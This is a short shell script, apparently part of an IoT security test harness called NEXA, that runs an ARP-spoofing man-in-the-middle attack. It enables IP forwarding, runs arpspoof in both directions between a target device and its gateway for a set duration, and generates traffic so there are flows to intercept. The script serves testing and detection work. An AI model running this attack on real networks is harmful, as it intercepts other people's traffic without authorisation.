#!/bin/sh
# NEXA test-attack: MITM — ARP-spoof between the victim device and the gateway so
# the attacker sits in the middle of the device's traffic (iot_test lane).
echo "[MITM] Starting..."
TARGET="${TARGET_HOST:-172.20.0.50}"
INTENSITY="${INTENSITY:-medium}"
DURATION="${DURATION:-60}"
# Gateway defaults to .1 of the target's /24 unless GATEWAY is provided
GATEWAY="${GATEWAY:-$(echo "$TARGET" | sed 's/\.[0-9]*$/.1/')}"
IFACE="${IFACE:-eth0}"
END=$(($(date +%s) + DURATION))

# Intensity -> spoofed-ARP send interval (seconds); lower = more aggressive
case "$INTENSITY" in
    low)    INTERVAL=5 ;;
    high)   INTERVAL=1 ;;
    *)      INTERVAL=2 ;;  # medium
esac

# Enable forwarding so intercepted traffic still flows (best-effort in container)
echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null

# Poison both directions so the attacker relays device <-> gateway
arpspoof -i "$IFACE" -t "$TARGET" "$GATEWAY" >/dev/null 2>&1 &
SPOOF1=$!
arpspoof -i "$IFACE" -t "$GATEWAY" "$TARGET" >/dev/null 2>&1 &
SPOOF2=$!

# Drive some traffic through the victim so there are flows to intercept
while [ "$(date +%s)" -lt "$END" ]; do
    curl -s -m 3 "http://$TARGET/" >/dev/null 2>&1
    sleep "$INTERVAL"
done

kill "$SPOOF1" "$SPOOF2" 2>/dev/null
echo "[MITM] Done."
